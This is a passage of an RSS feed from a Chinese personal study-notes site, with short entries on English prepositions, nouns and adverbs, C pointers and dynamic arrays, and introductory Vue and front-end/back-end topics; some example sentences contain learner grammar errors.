      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/about/</guid>
      <description>about 表示有关，关于 about + 名词  about Rainy. about Chongqing. about English.  about + 代词的宾格  about + me.  about 动名词短语  about haveing a party. about buying a ship.  当 about 表示关于的时候，只能作后置定语和表语，一般情况不能作状语。
The news about Rainy is not true.
The story is about Susu and Rainy.
表示在附近 about 有时候可以表示在&amp;hellip;附近。
表示在身边 about 表示在身边的时候，一般都用在固定结构里面：Have sth about sb.
 I have a cellphone about me. Jack had a gun about him.</description>
    </item>
    
    <item>
      <title>English after</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/after/</link>
      <pubDate>Thu, 14 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/after/</guid>
      <description>after 表示时间/顺序 after + 时间点 after 可以放在一个表示具体时间点的词语的前面，表示在&amp;hellip;之后。
 I sleep after 10:00 every day. I Fitness after work. She Play the game after class. I will retire after 35 years old . I born after 2001. I class after Sunday.  after + 一段时间 after 跟表示时间段的词语 。
 He come back after a week. after an hour. after three years.  after + 动名词短语  After getting up every morning, I turn on my computer.</description>
    </item>
    
    <item>
      <title>English as</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/as/</link>
      <pubDate>Thu, 14 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/as/</guid>
      <description>as 表示当作/作为 as + 一个表示人的名词  As a good wife, you should know how to cook. As a good husband, I must earn much money. As a Englishs teacher, I am happy.  as + 名词 这个时候 as + 名词是放在句尾作状语，这个时候 as 后面的名词不一定是表示人的名词。
 I eat rice gruel as breakfast.（把稀饭当作早餐） I chose the novel as my textbook. Don’t treat me as  </description>
    </item>
    
    <item>
      <title>English by</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/by/</link>
      <pubDate>Thu, 14 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/by/</guid>
      <description>by by 有时候是介词，有时候也会和其他的词组成一些介词短语。
 stand by pass by  这里主要说一些 by 作普通介词短情况。
表示时间  到&amp;hellip;为止。  By + 表示时间的词语，表示到某个时间点为止。
 He ought to be here by now. by the end of this term, I had learned 300 words. Rainy has made a lot of money by now.  表示位置  强调靠近 在&amp;hellip;旁边。 在&amp;hellip;身边。  by 可以表示位置，与 beside 是同义词。区别就是 beside 用的多，by 用的少，后者更强调靠近的意思。
 She lives by the sea. The house by the sea is beautiful.</description>
    </item>
    
    <item>
      <title>English during</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/during/</link>
      <pubDate>Thu, 14 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/during/</guid>
      <description>during 表示时间  在&amp;hellip;期间 在&amp;hellip;的时候  during + 表示特定时间的名词构成介词短语，但是 during 后面这个名词必须在意义上含有一段时间，又不能是表示时间点的词语，所以不能直接跟数词.
 during 5:10 She eared one million dollars during the ten days. He came during your absence.  </description>
    </item>
    
    <item>
      <title>English in</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/in/</link>
      <pubDate>Thu, 14 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/in/</guid>
      <description>in 表示在某个地方。 in + 大地方 这种情况，表示在某个地方，没有里面的意思。
 We live in the world. The people in Asia are poor. She is in Shanghai.  in + 小地方 这种情况，表示在某个地方内部。
 They are making shoes in the factory. They make shoes in the factory every. The girl in the factory are young.  另外，还有一些含有 in 的固定介词短语，这些固定的介词短语，有固定的意思和用法。
表示时间 in + 年份/月份  I set up my website in 2021. I met my wife in 2021.</description>
    </item>
    
    <item>
      <title>English on</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/on/</link>
      <pubDate>Thu, 14 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/on/</guid>
      <description>on 表示位置 在&amp;hellip;上面 on 加一个表示物体的名词，表示在这个物体的上面，并且强调跟物体的表面接触。
 Children are playing a game on the floor, The picture on the wall is expensive. My book is one the bed.  表示时间 在..时候 on + 表示时间的名词构成介词短语的时候，一般表示一天之内的时间（具体某一天），比如某日、星期几、日期、或某日的上午/中午/下午/晚上等等。
 The handsome man met Pandora on the morning of May 10,2003. We will have a party on July 15. He came on the morning of My 1st.  表示状态 处于&amp;hellip;状态  Who is on duty today? The house is on fire.</description>
    </item>
    
    <item>
      <title>C 多级指针</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E5%A4%9A%E7%BA%A7%E6%8C%87%E9%92%88/</link>
      <pubDate>Wed, 13 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E5%A4%9A%E7%BA%A7%E6%8C%87%E9%92%88/</guid>
      <description>多级指针 其实就是指针的指针int**，或指针的指针的指针int***，或者指针的指针的指针的指针int****。
#include &amp;lt;iostream&amp;gt;#include &amp;lt;malloc.h&amp;gt; int main() {  // i 存放的是 int 类型  int i = 10;  // p 存放 i 的地址，且这个地址只能是 int 类型的地址，因为 p 是 int 类型的指针变量。  int * p = &amp;amp;i;  // q 存放 p 的地址，且这个地址只能是 int * 类型的地址，不能存放 int 类型的地址，因为 q 是 int* 类型的指针变量。  int ** q = &amp;amp;p;  // r 存放 q 的地址,且这个地址只能int**的地址，不能存放 int * 类型的地址，因为 r 是 int **类型的指针变量。  int *** r = &amp;amp;q;  printf(&amp;#34;%d&amp;#34;,***r); } #include &amp;lt;iostream&amp;gt;#include &amp;lt;malloc.</description>
    </item>
    
    <item>
      <title>C 跨函数使用内存</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E8%B7%A8%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8%E5%86%85%E5%AD%98/</link>
      <pubDate>Wed, 13 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E8%B7%A8%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8%E5%86%85%E5%AD%98/</guid>
      <description>跨函数使用变量 静态内存不能跨函数使用 当静态函数终止之后，这个静态函数中的数据就不能被其他函数访问，因为这个静态函数的内存空间已经被释放了。就算可以使用，也是非法访问，这样是不对的。
#include &amp;lt;iostream&amp;gt;#include &amp;lt;malloc.h&amp;gt;// q 是指针变量，无论 q 是什么类型的指针变量，都只占 4 个字节 // 将实参 *p 传入 fun 函数的形参，则**q = *p, 则*q = p，q 存放的是 p 的地址， void fun(int **q){  int i = 5;  // ** q = i  // *q = p  //q = p 的地址  // **q = *p  // 因为 *q = p，所以这里相当于 p = &amp;amp;1，  *q = &amp;amp;i; } int main(void) {  int *p;  // 取 p（*p） 的地址，传入函数 fun，实际传入的是 *p，则 **q = *p  fun(&amp;amp;p);  // 下面代码语法没问题，但是逻辑上有问题。  // 这是因为当 fun 函数执行完毕后，fun 函数中的 i 变量已经被释放，  // 因此，p 虽然可以存放 i 的地址， 但是却不能访问 i 。  // 就算能够访问 i ，这也是非法的访问，没 error 是因为编译器的问题。  printf(&amp;#34;%d\n&amp;#34;,*p); } 动态内存可以跨函数使用 因为当一个函数执行完毕，动态内存分配的变量不会随着fun()的自动释放而释放，所以，当fun()被系统自动释放后，我们依旧可以访问变量*p</description>
    </item>
    
    <item>
      <title>English 专有名词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%90%8D%E8%AF%8D/%E4%B8%93%E6%9C%89%E5%90%8D%E8%AF%8D/</link>
      <pubDate>Wed, 13 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%90%8D%E8%AF%8D/%E4%B8%93%E6%9C%89%E5%90%8D%E8%AF%8D/</guid>
      <description>专用名词 专有名词，就是人名、地名、专门机构等。
大多数的专有名词是不可数名词，在某些情况下可以复数使用，或者转换为普通名词的单数/复数使用。
专有名词的首字母必须大写。
 Rainy is student. Beijing is beautiful China is so large. FBI is very famous  一个可数名词的单数是不能单独再句子或短语里面出现的，需要加限定词（形容词性物主代词，指示代词、数词等等）、冠词或变直接复数。比如 she is teacher这句话就是不对的，应该改为 she is a teacher 或者she is my teacher或 She is Nick&amp;rsquo;s teacher
特殊的 当Mother的首字母大写后，它表示称呼语，相当于一个专有名词，可以单独使用；如果是小写的mother，那么则表示可数名词单数，不能单独使用</description>
    </item>
    
    <item>
      <title>English 普通名词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%90%8D%E8%AF%8D/%E6%99%AE%E9%80%9A%E5%90%8D%E8%AF%8D/</link>
      <pubDate>Wed, 13 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%90%8D%E8%AF%8D/%E6%99%AE%E9%80%9A%E5%90%8D%E8%AF%8D/</guid>
      <description>普通名词 普通名词 除了专业名词以外的词都是普通名词。
普通名词被分为可数名词和不可数名词。
专有名词复数使用，专业名词转换普通名词  There are two Jacks in our class Millions of Lei Fengs have emerged in China Hey, Tom, have a Mrs. Carl is waiting for you  可数名词 可数名词（单数复数都可以，可以用数词计算）
可数名词能加不定冠词（a/an）和数词（one、two）
可数名词可以加定冠词（the）
比如 apple、egg、boy、tree、family、class、police、team 等等
可数名词单数不能单独作主语使用：Book is expensive.
正确的应该是：
 The Book is expensive. My books are good.  单数和复数 单数指的就是一个事物。复数指的是两个及以上的事物。
单数变复数规则  大部分可数名词可以直接在词尾 + s. 以字母 s、sh、x、ch 结尾时，在词尾 +es. 以辅音字母 +y 结尾的时候，把 y 变为 i 后，再 +es。如果以元音字母 + y 结尾时，就不用变化，直接在词尾 +s 即可。 以字母 f 或 fe 结尾的时候，把 f 或 fe 变为 v 后，再＋ es。 以辅音字母 + o 结尾的时候，在词尾 +es 以**元音字母 + o **结尾的可数名词或以 o 结尾的简写词，在词尾 +s.</description>
    </item>
    
    <item>
      <title>English 量词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%90%8D%E8%AF%8D/%E9%87%8F%E8%AF%8D/</link>
      <pubDate>Wed, 13 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%90%8D%E8%AF%8D/%E9%87%8F%E8%AF%8D/</guid>
      <description>量词 我们可以用量词来表示不可数名词的数量。但不是每一个量词都可以修饰每一个不可数名词。
当不可数名词的单复数变化时，只需将量词从单数变为复数。
量词中的 of 时没有意思的，它主要就是为了修饰不可数名词，作前置定语，另外，量词也可以修饰可数名词的复数形式，但不能修饰可数名词的的单数形式。毕竟一个名词用量词修饰，说明这个名词不止一个，如果这个名词还用单数形式的话，就不合理了。
 a glass of water. two bottle of milk. a kilograms of meat. a basket of apples  量词的构成 a/an/one + 可数名词单数 + of  a cup of a bucket of a glass of a box of  数词 + 可数名词的复数 + of  two bottles of three tins of the boxes of  并不是所有可数名词都能构成量词，只有那种有内部空间或表示容器或一些符合逻辑的可数名词才能构成量词。
不要用中文的量词思维来判断英文的量词使用。比如不能 a table of food，因为 table 没有内部空间或表示容器的意思。</description>
    </item>
    
    <item>
      <title>English 介词短语的构成</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E7%9F%AD%E8%AF%AD%E7%9A%84%E6%9E%84%E6%88%90/</link>
      <pubDate>Mon, 11 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E7%9F%AD%E8%AF%AD%E7%9A%84%E6%9E%84%E6%88%90/</guid>
      <description>介词短语的构成 要学好介词短语，先要掌握一个概念：介词宾语。
介词和介词宾语在一起构成的短语叫作介词短语：介词 + 介词宾语 = 介词短语
介词短语可以被分成四种类型。
介词宾语 介词后面的词语叫介词宾语。
介词宾语和宾语是不一样的，千万不要混淆。
宾语是动作的承受。
介词宾语仅仅只是放在介词后面的词语。
介词 + 名词 这是最常见、最普通、最容易的介词短语形式。绝大部分介词后面都可以跟一个名词构成一个介词短语。一个介词短语，不管这个名词是专有名词还是普通名词，当然如果是普通名词，要注意可数名词单复数的问题。
 in China. under the tree. behind my house. beside Rainy.  介词 + 人称代词宾格  beside me. before you. behind him.  介词 +数词 需要注意的是，并不是每一个介词后面都能跟数词。
 in 2023. at 5 : 30.  介词 +动词短语 虽然部分介词的后面可以跟动动词短语构成介词短语，但是这种介词短语的出现频率非常高。
 before having dinner. about learning English. by watching TV.  </description>
    </item>
    
    <item>
      <title>English 介词短语的用法</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E7%9F%AD%E8%AF%AD%E7%9A%84%E7%94%A8%E6%B3%95/</link>
      <pubDate>Mon, 11 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E7%9F%AD%E8%AF%AD%E7%9A%84%E7%94%A8%E6%B3%95/</guid>
      <description>介词短语的用法 作状语 介词短语作状语的时候，可以在主谓宾或主系表中充当时间状语和地点状语，有时候还可以充当方式状语。
作地点状语 当介词作地点状语的时候，这个介词就可以在句子中充当地点状语的作用
主系表 + 介词短语作地点状语
 I am happy in Guangxi. I was sad in Guangxi. They are busy in Beijing.  主谓宾 + 介词短语作地点状语
 I work in China.  作时间状语 当介词作时间状语的时候，这个介词就可以在句子中充当时间状语的作用
 I was young in 2023. I get up at six. We will be famous in 2020.  作方式状语 少数的介词短语，还能表达动作的方式。
 Can you write in English. I tell stories in English.  作后置定语 介词短语作后置定语，跟前置定语一样，只能修饰普通名词。</description>
    </item>
    
    <item>
      <title>CDN</title>
      <link>https://note.yxzi.xyz/note/technology/internet/cdn/</link>
      <pubDate>Sun, 10 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/cdn/</guid>
      <description>CDN 使网址的加载速度变快。</description>
    </item>
    
    <item>
      <title>Vue</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/vue/</link>
      <pubDate>Sun, 10 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/vue/</guid>
      <description>Vue Vue 是一套用于构建用户界面的渐进式 JavaScript 框架。
它主要解决了前端开发中的核心痛点 —— 复杂的 DOM 操作。
特点 渐进式 可以只将网站中的一个页面或网站中的某一个区域使用 Vue 来开发。当然，也可以整个网站都用 Vue 来开发。
组件化 采用组件化开发模式，将一个复杂的网站，简化为一个个的组件，独立开发，能提高代码复用率，且让代码更好维护。
响应式 数据响应式，即后台数据（model）发生变化，前台的内容（View），也会相应的变化。
其他 不在使用传统的命令式编码，在 Vue 中，使用声明式编码，让我们无需直接操作 DOM，提高开发效率。
. 使用虚拟 DOM + 优秀的 Diff 算法，尽量复用 DOM 节点。
Vue 应用场景 前台部分页面，用户看到的网站页面。
中台全部页面，网站给某些额非官方人员提供的管理页面。比如淘宝卖家的管理后台等。
后台全部页面，网站官方的后台管理页面。</description>
    </item>
    
    <item>
      <title>Vue 实例</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/vue-%E5%AE%9E%E4%BE%8B/</link>
      <pubDate>Sun, 10 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/vue-%E5%AE%9E%E4%BE%8B/</guid>
      <description>Vue 实例 new 一个 Vue 实例，并将其赋给一个配置对象 ：
var vm = new Vue({}) 该配置对象vm中有非常多的属性，大部分属性都是以$和_开头，这是为了避免与我们定义的属性重名。
以$开头的属性，都是供开发者使用的；而以_开头的属性，是内置属性，不供我们使用。</description>
    </item>
    
    <item>
      <title>使用 Vue</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E4%BD%BF%E7%94%A8-vue/</link>
      <pubDate>Sun, 10 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E4%BD%BF%E7%94%A8-vue/</guid>
      <description>使用 Vue  引入 Vue.js。  本地 js 文件。 Vue CDN。   脚手架。  官方脚手架vue-cli。 其他民间脚手架，如webpack-simple。 手动搭建，灵活性高。    第一个 Vue 程序 创建 Vue 实例，并传给一个配置对象。
root 容器里的代码被称为 Vue 模板，模板中是插值语法{{}}，其中只能写 JavaScrip 表达式。
一个 Vue 实例，只能控制一个容器，它们之间只能一一对应。
HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt; 	&amp;lt;head&amp;gt; 	&amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt; 	&amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt; 	&amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34; /&amp;gt; 	&amp;lt;script src=&amp;#34;https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;  	&amp;lt;title&amp;gt;Document&amp;lt;/title&amp;gt; 	&amp;lt;/head&amp;gt;  	&amp;lt;body&amp;gt; 	&amp;lt;!</description>
    </item>
    
    <item>
      <title>前端和后端</title>
      <link>https://note.yxzi.xyz/note/technology/frame/%E5%89%8D%E7%AB%AF%E5%92%8C%E5%90%8E%E7%AB%AF/</link>
      <pubDate>Sun, 10 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/%E5%89%8D%E7%AB%AF%E5%92%8C%E5%90%8E%E7%AB%AF/</guid>
      <description>前端和后端 前端 前端是链接终端设备与人的技术。行的网页，并配合后端做网页的数据显示和交互等可视方面的工作内容。 后端是指用户看不见的东西，通常是与前端工程师进行数据交互及网站数据的保存和读取，相对来说后端涉及到的逻辑代码比前端要多的多，后端考虑的是底层业务逻辑的实现，平台的稳定性与性能等。
所用技术 前端开发用到的技术包括但不限于 html5、css3、javascript、jquery、Bootstrap、Node.js 、Webpack，AngularJs，ReactJs，VueJs 等技术。 后端开发 以 java 为例 主要用到的 是包括但不限于 Struts spring springmvc Hibernate Http 协议 Servlet Tomcat 服务器等技术。
工作职责 前端工程师主要的工作职责分为三大部分，分别是传统的 Web 前端开发，移动端开发和大数据呈现端开发。Web 前端开发主要针对的是 PC 端开发任务；移动端开发则包括 Android 开发、iOS 开发和各种小程序开发，在移动互联网迅速发展的带动下，移动端的开发任务量是比较大的，随着 5G 标准的落地，未来移动端的开发任务将得到进一步的拓展；大数据呈现则主要是基于已有的平台完成最终分析结果的呈现，呈现方式通常也有多种选择，比如大屏展示等。 后端工程师的主要职责也集中在三大部分，分别是平台设计、接口设计和功能实现。平台设计主要是搭建后端的支撑服务容器；接口设计主要针对于不同行业进行相应的功能接口设计，通常一个平台有多套接口，就像卫星导航平台设有民用和军用两套接口一样；功能实现则是完成具体的业务逻辑实现。
知识结构 在知识结构方面，前端开发涉及到的内容包括 Html、CSS、JavaScript、Android 开发（采用 Java 或者 kotlin）、iOS 开发（采用 OC 或者 Swift）、各种小程序开发技术（类 Html），随着前端开发任务的不断拓展，前端开发后端化也是一个较为明显的趋势，比如 Nodejs 的应用。 后端开发通常需要根据业务场景进行不同语言的选择，另外后端开发的重点在于算法设计、数据结构、性能优化等方面，在具体的功能实现部分可以采用 Java、Python 或者 PHP 等编程语言来实现。对于不少中小企业来说，后端开发通常都会采用开源的开发平台，这样就可以把精力集中在业务处理上，通常应用级程序员就可以解决问题，相应的开发成本也会有大幅度的下降。
应用范围 从应用范围来看，前端开发不仅被常人所知、且应用场景也要比后端广泛的太多太多。 一是 PC (Personal Computer) 即个人电脑。目前电脑端仍是前端一个主要的领域，主要分为面向大众的各类网站，如新闻媒体、社交、电商、论坛等和面向管理员的各种 CMS (内容管理系统)和其它的后台管理系统。 二 Web App 是指使用 Web 开发技术，实现的有较好用户体验的 Web 应用程序。它是运行在手机和桌面端浏览中，随着移动端网络速度的提升，Web App 为我们提供了很大的便利。此外近两年 Google 提出了一种新的 Web App 形态，即 PWA(渐进增强 Web APP) 。三 WeChat (微信) 这个平台，拥有大量的用户群体，因此它也是我们前端开发另一个重要的领域。微信的公众号与订阅号为市场营销和自媒体从业者，打造了一个新的天地。 四 Hybrid App (混合应用) 是指介于 Web App、原生 App (主要是 Android 或 iOS )之间的 App，它兼具原生 App 良好用户交互体验的优势和 Web App 跨平台开发的优势。 五 Game（游戏），HTML5 游戏从 2014 年 Egret 引擎开发的神经猫引爆朋友圈之后，就开始一发不可收拾。不过现在游戏开发变得越来越复杂，需要制作各种炫丽炫丽的效果，还要制作各炫丽于 2D 或者 3D 的场景。 六 Desktop 桌面应用软件，就是我们日常生活中电脑中安装的各类软件。早期要开发桌面应用程序，就需要有专门的语言 UI (界面) 库支持，如 C++ 中的 Qt 库、MFC 库，Java 的 Swing、Python 的 PyQT 等，否则语言是没办法进行快速界面开发。 七 Server Node.</description>
    </item>
    
    <item>
      <title>C 动态一维数组</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%95%B0%E7%BB%84/%E5%8A%A8%E6%80%81%E4%B8%80%E7%BB%B4%E6%95%B0%E7%BB%84/</link>
      <pubDate>Sat, 09 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%95%B0%E7%BB%84/%E5%8A%A8%E6%80%81%E4%B8%80%E7%BB%B4%E6%95%B0%E7%BB%84/</guid>
      <description>动态一维数组 动态一维数组可以被当作静态一维数组来来用，换言之，静态数组可以实现的，动态数组都可以实现，不同的是，动态一维数组可以被我们使用free()函数助动释放掉，而且可以用realloc()动态的缩小或扩充。
而静态一维数组只能等当前函数执行完毕后，才会被系统自动释放。
#include &amp;lt;iostream&amp;gt;#include &amp;lt;malloc.h&amp;gt; int main() {  // 静态创建一维数组，数组大小为 20个字节  // 静态数组只能等它自己所在的函数 main 执行完毕后，才会被系统助动释放。  int a[5];   // 动态创建一维数组  // 数组长度  int len;  // 数组名  int * pArr;  //自定义数组长度  printf(&amp;#34;请输入你要存放的元素个数：&amp;#34;);  scanf(&amp;#34;%d&amp;#34;,&amp;amp;len);// 5  // 动态创建一维数组，数组大小为 20个字节，类似于 int pArr[len];  pArr = (int *)malloc(4 * len);   // 向动态数组里面添加元素  for(int i = 0; i &amp;lt; len; i++)  {  scanf(&amp;#34;%d&amp;#34;,&amp;amp;pArr[i]);  printf(&amp;#34;你向数组中添加了：%d\n&amp;#34;,pArr[i]);  }   // 输出动态数组中所有的元素  printf(&amp;#34;pArr 数组中的元素有：&amp;#34;);  for(int i = 0; i &amp;lt; len; i++)  {  printf(&amp;#34;%d、&amp;#34;,pArr[i]);  } } </description>
    </item>
    
    <item>
      <title>C 静态变量和动态变量</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E9%9D%99%E6%80%81%E5%8F%98%E9%87%8F%E5%92%8C%E5%8A%A8%E6%80%81%E5%8F%98%E9%87%8F/</link>
      <pubDate>Sat, 09 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E9%9D%99%E6%80%81%E5%8F%98%E9%87%8F%E5%92%8C%E5%8A%A8%E6%80%81%E5%8F%98%E9%87%8F/</guid>
      <description>静态变量和动态变量 如果一个变量所对应的内存空间是静态分配的，那么这个变量就是静态变量。
如果一个变量所对应的内存空间是动态分配的，那么这个变量就是动态变量。
静态变量 静态变量在栈内存中分配。由程序自动分配，也由程序自动释放。在函数运行的过程中，无法被使用者手动释放，必须等函数执行完毕。
动态变量 动态变量在堆内存中分配。由使用者手动分配，也由使用者手动释放。在函数的运行的过程中，可以被使用者手动释放，不需要等待函数执行完毕。</description>
    </item>
    
    <item>
      <title>English 副词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%89%AF%E8%AF%8D/%E5%89%AF%E8%AF%8D/</link>
      <pubDate>Sat, 09 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%89%AF%E8%AF%8D/%E5%89%AF%E8%AF%8D/</guid>
      <description>副词 用于修饰动词或形容词，有时也可以修饰数词、介词、连词、名词或一整个句子。
副词是表示行为或状态特征的词，主要作状语、也可以作表语、定语、补足语或介词宾语。
 I ate two apple quickly  当一个句子中同时出现多个不同的副词的时候，书写顺序如下：方式副词 —— 地点副词 —— 时间副词
特殊副词 在英语中，很多单词都有多重词性，比如一些单词，可以作副词，也可以作形容词，有些还有其他词性。
 High Deep Hard Early  high  The mountain is high.（形容词） The kite is flying high.（方式副词）  副词的比较级和最高级 副词也有比较级和最高级，但是注意了，一般情况下，只有方式副词才有比较级和最高级，其他副词一般没有，比较级和最高级的构成方式和形容词是一样的。
 I run faster than he. She speaks more slowly than than me. She did her homework more carefully than me.  </description>
    </item>
    
    <item>
      <title>English 地点副词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%89%AF%E8%AF%8D/%E5%9C%B0%E7%82%B9%E5%89%AF%E8%AF%8D/</link>
      <pubDate>Sat, 09 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%89%AF%E8%AF%8D/%E5%9C%B0%E7%82%B9%E5%89%AF%E8%AF%8D/</guid>
      <description>地点副词 大部分表示地点、方位的词语都是用介词短语来表示。地点副词也是主要作地点状语，当然，也不是每一个地点副词都可以作地点状语的。
 here there upstairs  地点副词和时间副词不同的，地点副词作地点状语的时候通常不受时态的影响，只要符合逻辑，基本大部分时态都可以用地点副词作状语。
一般情况，当一句话中同时出现地点状语和时间状语，那么，地点状语通常在前面，时间副词在后面
 I am visiting a friend here. I learn English here every day. They are having a party outside. They are safe abroad. We see ads everywhere.  少数地点副词可以作后置定语修饰名词。  The house here are expensive. The house abroad are expensive. We girl ustairs likes joe.  少数地点副词可以作表语。 作表语的时候，直接将地点副词放到系动词 be 后面。
 I am here. I was here last night. They are there.</description>
    </item>
    
    <item>
      <title>English 方式副词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%89%AF%E8%AF%8D/%E6%96%B9%E5%BC%8F%E5%89%AF%E8%AF%8D/</link>
      <pubDate>Sat, 09 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%89%AF%E8%AF%8D/%E6%96%B9%E5%BC%8F%E5%89%AF%E8%AF%8D/</guid>
      <description>方式副词 表示动作的方式的词语。
 Very much Loudly. fast.  方式副词只能作方式状语，并且只能修饰实义动词，所以方式副词只能用在动作的句子里面。
方式副词绝大部分放在句尾，少数情况可以放在中间和句首。
